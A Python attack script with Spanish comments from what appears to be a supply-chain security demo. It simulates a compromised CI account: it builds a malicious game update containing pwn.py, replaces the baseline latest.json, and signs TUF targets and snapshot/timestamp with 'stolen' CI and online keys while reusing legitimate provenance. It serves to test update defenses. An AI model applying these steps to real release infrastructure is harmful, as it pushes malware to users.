"""C1 — Cuenta comprometida (vía: cuenta comprometida; STRIDE: suplantación).

Capacidad del atacante: robó los secrets del CI (claves TUF targets-ci y online) y tiene escritura
en gh-pages. NO tiene targets-dev (está en el environment `release`, que exige aprobación).

Ataque, hecho en la PC del atacante y copiado al mirror:
- arma game-9.9.9.zip a partir del juego legítimo más pwn.py (importado desde main.py);
- baseline: reemplaza latest.json y sube el archivo;
- seguro: agrega los targets firmados SOLO con targets-ci y publica snapshot y timestamp con online.
  No tiene la identidad del workflow para cosign ni puede generar procedencia SLSA válida, así que
  reutiliza el bundle y la procedencia de la última versión legítima.

Uso: python attacks/c1_cuenta_comprometida/run.py   (después: el launcher; al final, reset_demo.py)
"""
import json
import shutil
import sys
import tempfile
from pathlib import Path

ATTACKS_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ATTACKS_DIR))
import common  # noqa: E402

sys.path.insert(0, str(common.ROOT / "tuf_repo"))
import repo_tool  # noqa: E402

SCENARIO = "C1"
VERSION = "9.9.9"


def main():
    common.require_mirror()
    secure = common.MIRROR / "secure"
    legit = common.read_json(secure / "targets" / "latest.json")
    zip_name = f"game-{VERSION}.zip"

    with tempfile.TemporaryDirectory() as tmp:
        work = Path(tmp)
        malicious = common.build_malicious_zip(secure / "targets" / legit["artifact"], work / zip_name,
                                               SCENARIO, VERSION)
        digest = common.sha256(malicious)
        print(f"zip malicioso: {zip_name} sha256={digest[:16]}…")

        # Canal baseline: con escritura en gh-pages basta con cambiar latest.json y subir el archivo.
        shutil.copy(malicious, common.MIRROR / "baseline" / "files" / zip_name)
        common.write_baseline_latest(VERSION, zip_name, digest)
        print("baseline: latest.json → 9.9.9 con el hash del zip malicioso")

        # Canal seguro: solo las claves robadas del CI. Bundle y procedencia: los de la versión legítima.
        bundle = work / f"{zip_name}.sigstore.json"
        provenance = work / f"{zip_name}.intoto.jsonl"
        shutil.copy(secure / "targets" / legit["bundle"], bundle)
        shutil.copy(secure / "targets" / legit["provenance"], provenance)
        latest = work / "latest.json"
        latest.write_text(json.dumps({"version": VERSION, "artifact": zip_name, "bundle": bundle.name,
                                      "provenance": provenance.name}) + "\n", encoding="utf-8")

        repo = repo_tool.Repo(secure)
        stolen_ci = repo_tool.load_signer("targets-ci", common.KEYS_DIR)
        stolen_online = repo_tool.load_signer("online", common.KEYS_DIR)
        repo_tool.add_targets(repo, [malicious, bundle, provenance, latest], stolen_ci)
        # El atacante no está obligado a usar la herramienta honesta: publica aunque falte una firma.
        repo_tool.update_snapshot_timestamp(repo, stolen_online, require_verified_targets=False)
    print("seguro: targets firmado solo con targets-ci; snapshot/timestamp publicados con online")


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    main()
